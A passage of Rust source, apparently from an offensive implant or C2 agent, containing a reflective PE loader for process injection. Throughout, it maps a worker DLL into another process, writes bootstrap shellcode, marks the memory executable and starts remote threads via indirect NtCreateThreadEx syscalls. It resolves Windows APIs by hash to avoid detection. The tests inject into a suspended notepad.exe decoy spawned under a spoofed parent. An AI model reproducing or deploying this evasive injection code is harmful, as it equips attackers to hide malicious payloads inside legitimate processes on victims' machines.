    while off + 8 <= reloc_size {
        let block = reloc_rva + off;
        let page_rva = u32::from_le_bytes(image[block..block + 4].try_into().unwrap()) as usize;
        let block_size = u32::from_le_bytes(image[block + 4..block + 8].try_into().unwrap()) as usize;
        if block_size < 8 {
            break;
        }
        let count = (block_size - 8) / 2;
        for i in 0..count {
            let entry_off = block + 8 + i * 2;
            if entry_off + 2 > image.len() {
                break;
            }
            let entry = u16::from_le_bytes(image[entry_off..entry_off + 2].try_into().unwrap());
            let typ = entry >> 12;
            let ent = (entry & 0x0FFF) as usize;
            let target = page_rva + ent;
            match typ {
                IMAGE_REL_BASED_ABSOLUTE => {}
                IMAGE_REL_BASED_DIR64 if layout.is_x64 => {
                    if target + 8 <= image.len() {
                        let mut v =
                            u64::from_le_bytes(image[target..target + 8].try_into().unwrap());
                        v = (v as i64).wrapping_add(delta) as u64;
                        image[target..target + 8].copy_from_slice(&v.to_le_bytes());
                    }
                }
                IMAGE_REL_BASED_HIGHLOW => {
                    if target + 4 <= image.len() {
                        let mut v =
                            u32::from_le_bytes(image[target..target + 4].try_into().unwrap());
                        v = (v as i32).wrapping_add(delta as i32) as u32;
                        image[target..target + 4].copy_from_slice(&v.to_le_bytes());
                    }
                }
                _ => {}
            }
        }
        off += block_size;
    }

    remote_write(h_process, alloc_base, &image)
}

/// Collect import (dll, func, ord, iat_va) tuples for child-side resolution.
///
/// Imports must be resolved *inside the child* (kernel32 is same-base across
/// processes, but CRT DLLs such as VCRUNTIME140 / ucrtbase are not — agent-side
/// addresses would AV in the child). Name and ordinal imports both supported
/// (ord != 0 → GetProcAddress by ordinal).
#[cfg(windows)]
fn build_import_plan(
    pe: &[u8],
    layout: &PeLayout,
    alloc_base: usize,
) -> Result<Vec<(Vec<u8>, Vec<u8>, u16, usize)>, String> {
    if layout.import_rva == 0 {
        return Ok(Vec::new());
    }
    let ord_flag: u64 = if layout.is_x64 {
        0x8000_0000_0000_0000
    } else {
        0x8000_0000
    };
    let step = if layout.is_x64 { 8 } else { 4 };
    let mut plan = Vec::new();
    let mut desc = layout.import_rva as usize;
    loop {
        let desc_off = rva_to_off(pe, layout, desc as u32).ok_or("import desc OOB")?;
        if desc_off + 20 > pe.len() {
            break;
        }
        let oft = u32::from_le_bytes(pe[desc_off..desc_off + 4].try_into().unwrap()) as usize;
        let name_rva = u32::from_le_bytes(pe[desc_off + 12..desc_off + 16].try_into().unwrap()) as usize;
        let first_thunk =
            u32::from_le_bytes(pe[desc_off + 16..desc_off + 20].try_into().unwrap()) as usize;
        if oft == 0 && name_rva == 0 && first_thunk == 0 {
            break;
        }
        if name_rva == 0 {
            break;
        }
        let name_off = rva_to_off(pe, layout, name_rva as u32).ok_or("dll name OOB")?;
        let dll_name = read_cstr_slice(pe, name_off).ok_or("bad import DLL name")?;
        let mut thunk_off = if oft != 0 { oft } else { first_thunk };
        let mut iat_rva = first_thunk;
        loop {
            let t_off = rva_to_off(pe, layout, thunk_off as u32).ok_or("thunk OOB")?;
            let raw = if layout.is_x64 {
                if t_off + 8 > pe.len() {
                    break;
                }
                u64::from_le_bytes(pe[t_off..t_off + 8].try_into().unwrap())
            } else {
                if t_off + 4 > pe.len() {
                    break;
                }
                u32::from_le_bytes(pe[t_off..t_off + 4].try_into().unwrap()) as u64
            };
            if raw == 0 {
                break;
            }
            if raw & ord_flag != 0 {
                let ord = (raw & 0xFFFF) as u16;
                plan.push((
                    dll_name.as_bytes().to_vec(),
                    Vec::new(),
                    ord,
                    alloc_base + iat_rva,
                ));
            } else {
                let hint_name = (raw as usize) & 0x7FFF_FFFF;
                let n_off = rva_to_off(pe, layout, hint_name as u32).ok_or("import name OOB")?;
                let func_name = read_cstr_slice(pe, n_off + 2).ok_or("bad import func name")?;
                plan.push((
                    dll_name.as_bytes().to_vec(),
                    func_name.as_bytes().to_vec(),
                    0,
                    alloc_base + iat_rva,
                ));
            }
            thunk_off += step;
            iat_rva += step;
        }
        desc += 20;
    }
    Ok(plan)
}

/// Build the bootstrap setup-page blob (no remote side effects).
///
/// Layout (see `BOOTSTRAP_SC`): header (loadlib/getproc/rtl_alloc/count),
/// per-import entries {dll_ptr, func_ptr, ord, iat_va}, TLS section
/// {tls_index_addr, 63, tls_block, worker entry, worker param}, then name
/// strings. `dll_ptr`/`func_ptr` are written as *relative* string offsets and
/// must be rebased onto the real setup VA with `rebase_bootstrap_blob`.
fn build_bootstrap_blob(
    plan: &[(Vec<u8>, Vec<u8>, u16, usize)],
    loadlib: usize,
    getproc: usize,
    rtl_alloc: usize,
    tls_index_addr: usize,
    tls_block: usize,
    entry: usize,
    param: usize,
) -> Vec<u8> {
    const ENTRY_STRIDE: usize = 32;
    const HDR_LEN: usize = 0x20;
    const TLS_SEC_LEN: usize = 40;

    // Compute per-entry string offsets within the trailing string pool.
    let mut dll_off = Vec::with_capacity(plan.len());
    let mut func_off = Vec::with_capacity(plan.len());
    let mut strings_len = 0usize;
    for (dll, func, _, _) in plan {
        dll_off.push(strings_len);
        strings_len += dll.len() + 1;
        func_off.push(strings_len);
        strings_len += func.len() + 1;
    }

    let tls_off = HDR_LEN + plan.len() * ENTRY_STRIDE;
    let mut blob = vec![0u8; tls_off + TLS_SEC_LEN + strings_len];

    // Header.
    blob[0..8].copy_from_slice(&(loadlib as u64).to_le_bytes());
    blob[8..16].copy_from_slice(&(getproc as u64).to_le_bytes());
    blob[16..24].copy_from_slice(&(rtl_alloc as u64).to_le_bytes());
    blob[24..32].copy_from_slice(&(plan.len() as u64).to_le_bytes());

    // Import entries (string pointers relative to page start for now).
    let str_base = tls_off + TLS_SEC_LEN;
    for (i, (_, _, ord, iat_va)) in plan.iter().enumerate() {
        let e = HDR_LEN + i * ENTRY_STRIDE;
        blob[e..e + 8].copy_from_slice(&((str_base + dll_off[i]) as u64).to_le_bytes());
        blob[e + 8..e + 16].copy_from_slice(&((str_base + func_off[i]) as u64).to_le_bytes());
        blob[e + 16..e + 18].copy_from_slice(&ord.to_le_bytes()); // ord (0 = by name)
        blob[e + 24..e + 32].copy_from_slice(&(*iat_va as u64).to_le_bytes());
    }

    // TLS section.
    blob[tls_off..tls_off + 8].copy_from_slice(&(tls_index_addr as u64).to_le_bytes());
    blob[tls_off + 8..tls_off + 16].copy_from_slice(&63u64.to_le_bytes()); // TLS slot
    blob[tls_off + 16..tls_off + 24].copy_from_slice(&(tls_block as u64).to_le_bytes());
    blob[tls_off + 24..tls_off + 32].copy_from_slice(&(entry as u64).to_le_bytes());
    blob[tls_off + 32..tls_off + 40].copy_from_slice(&(param as u64).to_le_bytes());

    // Name strings.
    let mut si = tls_off + TLS_SEC_LEN;
    for (dll, func, _, _) in plan {
        blob[si..si + dll.len()].copy_from_slice(dll);
        si += dll.len() + 1;
        blob[si..si + func.len()].copy_from_slice(func);
        si += func.len() + 1;
    }
    blob
}

/// Rebase the per-entry string pointers of a blob onto its real setup VA.
fn rebase_bootstrap_blob(blob: &mut [u8], plan_len: usize, setup_va: usize) {
    const ENTRY_STRIDE: usize = 32;
    const HDR_LEN: usize = 0x20;
    for i in 0..plan_len {
        let e = HDR_LEN + i * ENTRY_STRIDE;
        let d = u64::from_le_bytes(blob[e..e + 8].try_into().unwrap()) + setup_va as u64;
        let f = u64::from_le_bytes(blob[e + 8..e + 16].try_into().unwrap()) + setup_va as u64;
        blob[e..e + 8].copy_from_slice(&d.to_le_bytes());
        blob[e + 8..e + 16].copy_from_slice(&f.to_le_bytes());
    }
}

/// Write the bootstrap shellcode + setup page into the child.
/// Returns `(sc_va, setup_va)`.
#[cfg(windows)]
unsafe fn write_bootstrap_setup(
    h_process: usize,
    plan: &[(Vec<u8>, Vec<u8>, u16, usize)],
    loadlib: usize,
    getproc: usize,
    rtl_alloc: usize,
    tls_index_addr: usize,
    tls_block: usize,
    entry: usize,
    param: usize,
) -> Result<(usize, usize), String> {
    let mut blob = build_bootstrap_blob(
        plan,
        loadlib,
        getproc,
        rtl_alloc,
        tls_index_addr,
        tls_block,
        entry,
        param,
    );
    let setup_size = blob.len().max(0x1000);
    let setup_va = remote_alloc(h_process, setup_size)?;
    rebase_bootstrap_blob(&mut blob, plan.len(), setup_va);
    remote_write(h_process, setup_va, &blob)?;

    let sc_va = remote_alloc(h_process, 0x1000)?;
    if let Err(e) = remote_write(h_process, sc_va, &BOOTSTRAP_SC) {
        remote_free(h_process, sc_va);
        remote_free(h_process, setup_va);
        return Err(e);
    }

    // Flip both regions to RX after writing (minimize RWX window)
    if let Err(e) = remote_protect(h_process, sc_va, 0x1000, PAGE_EXECUTE_READ) {
        remote_free(h_process, sc_va);
        remote_free(h_process, setup_va);
        return Err(e);
    }
    if let Err(e) = remote_protect(h_process, setup_va, setup_size, PAGE_EXECUTE_READ) {
        remote_free(h_process, sc_va);
        remote_free(h_process, setup_va);
        return Err(e);
    }
    #[cfg(debug_assertions)]
    info!(
        "[worker] bootstrap sc=0x{:x} setup=0x{:x} imports={}",
        sc_va,
        setup_va,
        plan.len()
    );
    Ok((sc_va, setup_va))
}

fn resolve_export_rva(pe: &[u8], layout: &PeLayout, name: &[u8]) -> Option<u32> {
    if layout.export_rva == 0 || layout.export_size < 40 {
        return None;
    }
    // Use file-mapped section data: walk exports from raw PE via RVAs into file sections.
    // Build a simple RVA→file offset via sections.
    let rva_to_off = |rva: u32| -> Option<usize> {
        for &(va, raw_ptr, raw_size, _vs) in &layout.sections {
            if rva >= va && (rva as u64) < (va as u64 + raw_size.max(1) as u64) {
                return Some((raw_ptr + (rva - va)) as usize);
            }
        }
        if (rva as usize) < layout.size_of_headers {
            return Some(rva as usize);
        }
        None
    };

    let exp_off = rva_to_off(layout.export_rva)?;
    if exp_off + 40 > pe.len() {
        return None;
    }
    let num_names = u32::from_le_bytes(pe[exp_off + 24..exp_off + 28].try_into().ok()?) as usize;
    let addr_of_functions =
        u32::from_le_bytes(pe[exp_off + 28..exp_off + 32].try_into().ok()?);
    let addr_of_names = u32::from_le_bytes(pe[exp_off + 32..exp_off + 36].try_into().ok()?);
    let addr_of_ordinals = u32::from_le_bytes(pe[exp_off + 36..exp_off + 40].try_into().ok()?);

    for i in 0..num_names {
        let name_rva_off = rva_to_off(addr_of_names.wrapping_add((i * 4) as u32))?;
        if name_rva_off + 4 > pe.len() {
            continue;
        }
        let name_rva = u32::from_le_bytes(pe[name_rva_off..name_rva_off + 4].try_into().ok()?);
        let name_off = rva_to_off(name_rva)?;
        let ename = read_cstr_slice(pe, name_off)?;
        if ename.as_bytes() == name {
            let ord_off = rva_to_off(addr_of_ordinals.wrapping_add((i * 2) as u32))?;
            if ord_off + 2 > pe.len() {
                return None;
            }
            let ord = u16::from_le_bytes(pe[ord_off..ord_off + 2].try_into().ok()?) as usize;
            let func_rva_off = rva_to_off(addr_of_functions.wrapping_add((ord * 4) as u32))?;
            if func_rva_off + 4 > pe.len() {
                return None;
            }
            let func_rva = u32::from_le_bytes(pe[func_rva_off..func_rva_off + 4].try_into().ok()?);
            if func_rva == 0 {
                return None;
            }
            // Skip forwarded exports (RVA inside export dir)
            if func_rva >= layout.export_rva && func_rva < layout.export_rva + layout.export_size {
                return None;
            }
            return Some(func_rva);
        }
    }
    None
}

fn read_cstr_slice(buf: &[u8], off: usize) -> Option<String> {
    if off >= buf.len() {
        return None;
    }
    let end = buf[off..].iter().position(|&b| b == 0).unwrap_or(0);
    if end == 0 && buf[off] != 0 {
        // no null within — cap
        let end = (buf.len() - off).min(512);
        return std::str::from_utf8(&buf[off..off + end]).ok().map(|s| s.to_string());
    }
    std::str::from_utf8(&buf[off..off + end])
        .ok()
        .map(|s| s.to_string())
}

// ── Remote memory helpers (PEB-resolved; no inject feature dependency) ──────

#[cfg(windows)]
unsafe fn remote_alloc(h_process: usize, size: usize) -> Result<usize, String> {
    let k32 = stealth::get_module_base(stealth::hash_module_name(b"kernel32.dll"));
    if k32 == 0 {
        return Err("kernel32 not found".into());
    }
    type VirtualAllocExFn = unsafe extern "system" fn(usize, *mut u8, usize, u32, u32) -> *mut u8;
    let va: VirtualAllocExFn = std::mem::transmute(
        stealth::get_api_addr(k32, stealth::hash_api_name(b"VirtualAllocEx"))
            .ok_or("VirtualAllocEx unresolved")?,
    );
    let base = va(
        h_process,
        ptr::null_mut(),
        size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    );
    if base.is_null() {
        return Err("VirtualAllocEx returned NULL".into());
    }
    Ok(base as usize)
}

#[cfg(windows)]
unsafe fn remote_write(h_process: usize, base: usize, data: &[u8]) -> Result<(), String> {
    let k32 = stealth::get_module_base(stealth::hash_module_name(b"kernel32.dll"));
    type WriteProcessMemoryFn =
        unsafe extern "system" fn(usize, *mut u8, *const u8, usize, *mut usize) -> i32;
    let wpm: WriteProcessMemoryFn = std::mem::transmute(
        stealth::get_api_addr(k32, stealth::hash_api_name(b"WriteProcessMemory"))
            .ok_or("WriteProcessMemory unresolved")?,
    );
    let mut written = 0usize;
    let ok = wpm(
        h_process,
        base as *mut u8,
        data.as_ptr(),
        data.len(),
        &mut written,
    );
    if ok == 0 || written != data.len() {
        return Err(format!(
            "WriteProcessMemory failed (written={written}/{})",
            data.len()
        ));
    }
    Ok(())
}

/// Change memory protection on remote process region (RW → RX for executable sections).
#[cfg(windows)]
unsafe fn remote_protect(h_process: usize, addr: usize, size: usize, prot: u32) -> Result<(), String> {
    let k32 = stealth::get_module_base(stealth::hash_module_name(b"kernel32.dll"));
    type VirtualProtectExFn =
        unsafe extern "system" fn(usize, *mut u8, usize, u32, *mut u32) -> i32;
    let vp: VirtualProtectExFn = std::mem::transmute(
        stealth::get_api_addr(k32, stealth::hash_api_name(b"VirtualProtectEx"))
            .ok_or("VirtualProtectEx unresolved")?,
    );
    let mut old: u32 = 0;
    let ok = vp(h_process, addr as *mut u8, size, prot, &mut old);
    if ok == 0 {
        return Err("VirtualProtectEx failed".into());
    }
    Ok(())
}

/// Read remote memory (used by diagnostics; the loader itself only writes).
#[cfg(windows)]
unsafe fn remote_read(h_process: usize, base: usize, size: usize) -> Result<Vec<u8>, String> {
    let k32 = stealth::get_module_base(stealth::hash_module_name(b"kernel32.dll"));
    type ReadProcessMemoryFn =
        unsafe extern "system" fn(usize, *const u8, *mut u8, usize, *mut usize) -> i32;
    let rpm: ReadProcessMemoryFn = std::mem::transmute(
        stealth::get_api_addr(k32, stealth::hash_api_name(b"ReadProcessMemory"))
            .ok_or("ReadProcessMemory unresolved")?,
    );
    let mut buf = vec![0u8; size];
    let mut readn = 0usize;
    let ok = rpm(
        h_process,
        base as *const u8,
        buf.as_mut_ptr(),
        size,
        &mut readn,
    );
    if ok == 0 || readn != size {
        return Err(format!("ReadProcessMemory failed (read={readn}/{size})"));
    }
    Ok(buf)
}

#[cfg(windows)]
unsafe fn remote_free(h_process: usize, base: usize) {
    let k32 = stealth::get_module_base(stealth::hash_module_name(b"kernel32.dll"));
    type VirtualFreeExFn = unsafe extern "system" fn(usize, *mut u8, usize, u32) -> i32;
    if let Some(a) = stealth::get_api_addr(k32, stealth::hash_api_name(b"VirtualFreeEx")) {
        let vf: VirtualFreeExFn = std::mem::transmute(a);
        let _ = vf(h_process, base as *mut u8, 0, 0x8000); // MEM_RELEASE
    }
}

#[cfg(windows)]
unsafe fn remote_create_thread_with_param(
    h_process: usize,
    entry: usize,
    param: usize,
) -> Result<usize, String> {
    let mut thread_handle: usize = 0;
    let desired_access: u32 = 0x1F_FFFF;
    let status = crate::syscalls::indirect_syscall(
        stealth::hash_api_name(b"NtCreateThreadEx"),
        &[
            &mut thread_handle as *mut usize as usize,
            desired_access as usize,
            0,
            h_process,
            entry,
            param,
            0,
            0,
            0,
            0,
            0,
        ],
    );
    if status >= 0 && thread_handle != 0 {
        return Ok(thread_handle);
    }

    let k32 = stealth::get_module_base(stealth::hash_module_name(b"kernel32.dll"));
    type CreateRemoteThreadFn = unsafe extern "system" fn(
        usize,
        *mut u8,
        usize,
        usize,
        *mut u8,
        u32,
        *mut u32,
    ) -> usize;
    let crt: CreateRemoteThreadFn = std::mem::transmute(
        stealth::get_api_addr(k32, stealth::hash_api_name(b"CreateRemoteThread"))
            .ok_or_else(|| {
                format!(
                    "NtCreateThreadEx 0x{:08X}; CreateRemoteThread unresolved",
                    status as u32
                )
            })?,
    );
    let h = crt(
        h_process,
        ptr::null_mut(),
        0,
        entry,
        param as *mut u8,
        0,
        ptr::null_mut(),
    );
    if h == 0 {
        return Err(format!(
            "NtCreateThreadEx 0x{:08X}; CreateRemoteThread NULL",
            status as u32
        ));
    }
    if status < 0 {
        #[cfg(debug_assertions)]
        warn!(
            "[worker] NtCreateThreadEx failed 0x{:08X}, used CreateRemoteThread",
            status as u32
        );
    }
    Ok(h)
}

// ── Pure helpers / unit tests ───────────────────────────────────────────────

/// Validate PE is a plausible reflective worker image (public for tests).
pub fn validate_worker_pe(pe: &[u8]) -> Result<(u64, u32, usize), String> {
    let l = parse_pe_layout(pe)?;
    Ok((l.image_base, l.entry_rva, l.size_of_image))
}

/// Prefer export `x1` over AddressOfEntryPoint when present (public for tests).
pub fn resolve_worker_entry_rva(pe: &[u8]) -> Result<u32, String> {
    let l = parse_pe_layout(pe)?;
    Ok(resolve_export_rva(pe, &l, b"x1").unwrap_or(l.entry_rva))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn rejects_non_pe() {
        assert!(validate_worker_pe(b"MZ").is_err());
        assert!(validate_worker_pe(&[0u8; 128]).is_err());
    }

    #[test]
    fn parse_real_cdylib_if_present() {
        let candidates = [
            std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR"))
                .join("../target/release/mod_inject.dll"),
            std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR"))
                .join("../target/debug/mod_inject.dll"),
            std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR"))
                .join("../target/debug/ad_worker.dll"),
            std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR"))
                .join("../target/release/app_rt.dll"),
            std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR"))
                .join("../target/debug/app_rt.dll"),
            std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR"))
                .join("../target/release/mod_bof.dll"),
        ];
        let Some(path) = candidates.into_iter().find(|p| p.is_file()) else {
            eprintln!("skip: no built worker/bof DLL for reflective PE parse");
            return;
        };
        let pe = std::fs::read(&path).expect("read dll");
        let (base, entry, soi) = validate_worker_pe(&pe).expect("parse pe");
        assert!(soi > 0x1000, "SizeOfImage too small: {soi}");
        assert!(entry != 0 || resolve_worker_entry_rva(&pe).unwrap_or(0) != 0);
        eprintln!(
            "OK reflective parse {} base=0x{:x} entry=0x{:x} soi=0x{:x}",
            path.display(),
            base,
            entry,
            soi
        );
        let er = resolve_worker_entry_rva(&pe).unwrap();
        assert!(er > 0, "entry rva must be non-zero");
        assert!((er as usize) < soi, "entry rva out of image");
    }

    #[test]
    fn export_x1_preferred_when_present() {
        // Minimal synthetic check: empty PE fails cleanly
        assert!(resolve_worker_entry_rva(b"notpe").is_err());
    }

    /// Prove remote alloc/write/thread primitives work independent of Rust CRT.
    #[test]
    #[cfg(windows)]
    fn remote_shellcode_ret_thread_smoke() {
        let host = "C:\\Windows\\System32\\notepad.exe";
        let parent = crate::isolated_exec::pick_parent_for_supervisor();
        let child = match native::spawn::spawn_spoofed_piped_result(&format!("\"{host}\""), parent)
        {
            Ok(c) => c,
            Err(e) => {
                eprintln!("skip: spawn host failed: {e}");
                return;
            }
        };
        // x64: xor eax,eax; ret
        let sc: [u8; 3] = [0x31, 0xC0, 0xC3];
        unsafe {
            let base = remote_alloc(child.h_process, 0x1000).expect("alloc");
            remote_write(child.h_process, base, &sc).expect("write");
            let th = remote_create_thread_with_param(child.h_process, base, 0).expect("thread");
            let _ = native::wait_for_single_object_timeout(th, 5_000);
            let _ = native::close_handle(th);
            remote_free(child.h_process, base);
        }
        let _ = native::terminate_process_handle(child.h_process);
        let _ = native::close_handle(child.stdin_write);
        let _ = native::close_handle(child.stdout_read);
        let _ = native::close_handle(child.h_process);
        eprintln!("OK remote shellcode ret thread smoke");
    }

    /// Prove the suspended decoy stays alive and writable (Win11 app-stub hosts).
    #[test]
    #[cfg(windows)]
    fn suspended_decoy_probe() {
        let parent = crate::isolated_exec::pick_parent_for_supervisor();
        let child = match native::spawn::spawn_suspended_decoy(
            "\"C:\\Windows\\System32\\notepad.exe\"",
            parent,
        ) {
            Ok(c) => c,
            Err(e) => {
                eprintln!("skip: suspended decoy spawn failed: {e}");
                return;
            }
        };
        eprintln!(
            "decoy pid={} hproc=0x{:x} exited={:?}",
            child.pid,
            child.h_process,
            native::spawn::process_has_exited(child.h_process)
        );
        // Remote write must work into the frozen process.
        let sc: [u8; 3] = [0x31, 0xC0, 0xC3];
        unsafe {
            match remote_alloc(child.h_process, 0x1000)
                .and_then(|b| {
                    remote_write(child.h_process, b, &sc)?;
                    remote_create_thread_with_param(child.h_process, b, 0).map(|t| (b, t))
                }) {
                Ok((b, t)) => {
                    let _ = native::wait_for_single_object_timeout(t, 3_000);
                    let _ = native::close_handle(t);
                    remote_free(child.h_process, b);
                    eprintln!("decoy remote thread ok");
                }
                Err(e) => eprintln!("decoy remote ops failed: {e}"),
            }
        }
        std::thread::sleep(std::time::Duration::from_millis(300));
        eprintln!(
            "decoy after 300ms exited={:?}",
            native::spawn::process_has_exited(child.h_process)
        );
        let _ = native::terminate_process_handle(child.h_process);
        let _ = native::close_handle(child.h_process);
    }

    /// Stage-by-stage diagnostics for the reflective bootstrap: run the REAL
    /// bootstrap with a ret-stub entry (proves imports + TLS registration),
    /// then with a marker stub in front of the real worker x1 (splits
    /// "bootstrap crash" from "worker crash").
    #[test]
    #[cfg(windows)]
    fn bootstrap_stage_diag() {
        unsafe fn thread_exit_code(h: usize) -> Option<u32> {
            let k32 = stealth::get_module_base(stealth::hash_module_name(b"kernel32.dll"));
            if k32 == 0 {
                return None;
            }
            if let Some(a) = stealth::get_api_addr(k32, stealth::hash_api_name(b"GetExitCodeThread"))
            {
                type F = unsafe extern "system" fn(usize, *mut u32) -> i32;
                let f: F = std::mem::transmute(a);
                let mut code: u32 = 0;
                if f(h, &mut code) != 0 {
                    return Some(code);
                }
            }
            None
        }

        let path = std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR"))
            .join("../target/debug/ad_worker.dll");
        if !path.is_file() {
            eprintln!("skip: ad_worker.dll not built");
            return;
        }
        let pe = std::fs::read(&path).expect("read");
        let layout = parse_pe_layout(&pe).expect("layout");
        let x1 = resolve_export_rva(&pe, &layout, b"x1").expect("x1 export");
        eprintln!(
            "diag: soi=0x{:x} x1_rva=0x{:x} imports_rva=0x{:x} tls_rva=0x{:x} tls_sz=0x{:x}",
            layout.size_of_image, x1, layout.import_rva, layout.tls_rva, layout.tls_size
        );
        let parent = crate::isolated_exec::pick_parent_for_supervisor();

        let k32 = unsafe { stealth::get_module_base(stealth::hash_module_name(b"kernel32.dll")) };
        let loadlib = unsafe { stealth::get_api_addr(k32, stealth::hash_api_name(b"LoadLibraryA")) };
        let getproc = unsafe { stealth::get_api_addr(k32, stealth::hash_api_name(b"GetProcAddress")) };
        let ntdll = unsafe { stealth::get_module_base(stealth::hash_module_name(b"ntdll.dll")) };
        let rtl_alloc =
            unsafe { stealth::get_api_addr(ntdll, stealth::hash_api_name(b"RtlAllocateHeap")) };
        let (loadlib, getproc, rtl_alloc) = match (loadlib, getproc, rtl_alloc) {
            (Some(a), Some(b), Some(c)) => (a, b, c),
            _ => {
                eprintln!("skip: api resolve failed");
                return;
            }
        };

        let ret_stub: [u8; 3] = [0x31, 0xC0, 0xC3];

        struct Fx {
            _child: crate::native::spawn::SpoofedPipedChild,
            hp: usize,
            base: usize,
            tls_block: usize,
            tls_index: usize,
            plan: Vec<(Vec<u8>, Vec<u8>, u16, usize)>,
            sc: usize,
            ret: usize,
            setup: usize,
        }
        let new_fx = || -> Result<Fx, String> {
            unsafe {
                let child = crate::native::spawn::spawn_suspended_decoy(
                    "\"C:\\Windows\\System32\\notepad.exe\"",
                    parent,
                )?;
                let hp = child.h_process;
                let base = remote_alloc(hp, layout.size_of_image)?;
                map_image_remote(hp, &pe, &layout, base)?;
                apply_relocations_remote(hp, &pe, &layout, base)?;
                // Image stays RW — bootstrap writes to IAT inside the image.
                let (tb, tia) = setup_remote_tls(hp, &pe, &layout, base)?;
                let plan = build_import_plan(&pe, &layout, base)?;
                let sc = remote_alloc(hp, 0x1000)?;
                remote_write(hp, sc, &BOOTSTRAP_SC)?;
                remote_protect(hp, sc, 0x1000, PAGE_EXECUTE_READ)?;
                let ret = remote_alloc(hp, 0x1000)?;
                remote_write(hp, ret, &ret_stub)?;
                remote_protect(hp, ret, 0x1000, PAGE_EXECUTE_READ)?;
                let setup = remote_alloc(hp, 0x4000)?;
                Ok(Fx {
                    _child: child,
                    hp,
                    base,
                    tls_block: tb,
                    tls_index: tia,
                    plan,
                    sc,
                    ret,
                    setup,
                })
            }
        };

        // Run one stage: write setup blob, spawn remote thread at shellcode.
        // On timeout (hang), suspend the thread and dump its CONTEXT to locate
        // the stuck instruction before resuming/closing.
        let run_stage = |fx: &Fx,
                         subset: &[(Vec<u8>, Vec<u8>, u16, usize)],
                         entry: usize,
                         param: usize,
                         force_no_tls: bool|
         -> (bool, Option<u32>) {
            unsafe {
                let mut blob = build_bootstrap_blob(
                    subset,
                    loadlib,
                    getproc,
                    rtl_alloc,
                    if force_no_tls { 0 } else { fx.tls_index },
                    fx.tls_block,
                    entry,
                    param,
                );
                rebase_bootstrap_blob(&mut blob, subset.len(), fx.setup);
                remote_write(fx.hp, fx.setup, &blob).expect("setup write");
                let th = remote_create_thread_with_param(fx.hp, fx.sc, fx.setup).expect("thread");
                let signaled = native::wait_for_single_object_timeout(th, 5_000);
                let tec = unsafe { thread_exit_code(th) };
                if !signaled {
                    let k32 =
                        stealth::get_module_base(stealth::hash_module_name(b"kernel32.dll"));
                    if let Some(sp) =
                        stealth::get_api_addr(k32, stealth::hash_api_name(b"SuspendThread"))
                    {
                        type S = unsafe extern "system" fn(usize) -> u32;
                        let suspend: S = std::mem::transmute(sp);
                        let _ = suspend(th);
                    }
                    if let Some(gt) =
                        stealth::get_api_addr(k32, stealth::hash_api_name(b"GetThreadContext"))
                    {
                        type G = unsafe extern "system" fn(usize, *mut u8) -> i32;
                        let mut ctx = vec![0u8; 0x4D0];
                        ctx[0x30..0x34].copy_from_slice(&0x1000Fu32.to_le_bytes());
                        let get: G = std::mem::transmute(gt);
                        if get(th, ctx.as_mut_ptr()) != 0 {
                            let rd =
                                |o: usize| u64::from_le_bytes(ctx[o..o + 8].try_into().unwrap());
                            eprintln!(
                                "  ctx: rip=0x{:x} rax=0x{:x} rcx=0x{:x} rdx=0x{:x} r8=0x{:x} r9=0x{:x} rsp=0x{:x}",
                                rd(0xF8),
                                rd(0x78),
                                rd(0x80),
                                rd(0x88),
                                rd(0xB8),
                                rd(0xC0),
                                rd(0x98)
                            );
                            for (tag, p) in [("rcx", rd(0x80)), ("rdx", rd(0x88))] {
                                if (0x1_0000..0x7f00_0000_0000).contains(&p) {
                                    if let Ok(sb) = remote_read(fx.hp, p as usize, 64) {
                                        let s: Vec<u8> = sb
                                            .iter()
                                            .take_while(|&&c| c != 0)
                                            .copied()
                                            .collect();
                                        eprintln!("  {tag} -> '{}'", String::from_utf8_lossy(&s));
                                    }
                                }
                            }
                        }
                    }
                    if let Some(rs) =
                        stealth::get_api_addr(k32, stealth::hash_api_name(b"ResumeThread"))
                    {
                        type R = unsafe extern "system" fn(usize) -> u32;
                        let resume: R = std::mem::transmute(rs);
                        let _ = resume(th);
                    }
                }
                let _ = native::close_handle(th);
                (signaled, tec)
            }
        };

        let child_dead = |fx: &Fx| native::spawn::process_has_exited(fx.hp) == Some(true);

        let mut fx = new_fx().expect("fx");
        eprintln!(
            "fx0: base=0x{:x} tls_block=0x{:x} tls_index=0x{:x} imports={}",
            fx.base,
            fx.tls_block,
            fx.tls_index,
            fx.plan.len()
        );

        // ── Stage 0: count=0, TLS path active (tls_index registered). ──
        let (s, e) = run_stage(&fx, &[], fx.ret, fx.setup, false);
        eprintln!("S0 count=0 TLS-on : signaled={} exit={e:?} dead={}", s, child_dead(&fx));
        if e == Some(0) && !child_dead(&fx) {
            let idx = unsafe { remote_read(fx.hp, fx.tls_index, 4) };
            eprintln!("S0 _tls_index = {:?} (expect 63)", idx.map(|b| u32::from_le_bytes(b.try_into().unwrap())));
        }

        // ── Stage 1: count=0, TLS forced off (no_tls path). ──
        let (s, e) = run_stage(&fx, &[], fx.ret, fx.setup, true);
        eprintln!("S1 count=0 TLS-off: signaled={} exit={e:?} dead={}", s, child_dead(&fx));

        // ── Stage 2: growing import subsets, ret-stub entry. ──
        let mut last_ok = 0usize;
        let mut failed: Option<usize> = None;
        let counts = [1usize, 2, 4, 8, 16, 32, 64, 107];
        for &c in &counts {
            if child_dead(&fx) {
                fx = new_fx().expect("fx respawn");
                eprintln!("respawned fx: base=0x{:x} tls_block=0x{:x} tls_index=0x{:x}", fx.base, fx.tls_block, fx.tls_index);
            }
            let n = c.min(fx.plan.len());
            let (s, e) = run_stage(&fx, &fx.plan[..n], fx.ret, fx.setup, false);
            eprintln!(
                "S2 count={n}: signaled={s} exit={e:?} dead={}",
                child_dead(&fx)
            );
            if e != Some(0) || child_dead(&fx) {
                failed = Some(n);
                eprintln!("S2 CRASH at count={n} (exit={e:?})");
                break;
            }
            last_ok = n;
            let mut ok = 0;
            for (dll, func, ord, iat_va) in fx.plan[..n.min(4)].iter() {
                if let Ok(b) = unsafe { remote_read(fx.hp, *iat_va, 8) } {
                    let v = u64::from_le_bytes(b.try_into().unwrap());
                    if v >= 0x1_0000_0000 {
                        ok += 1;
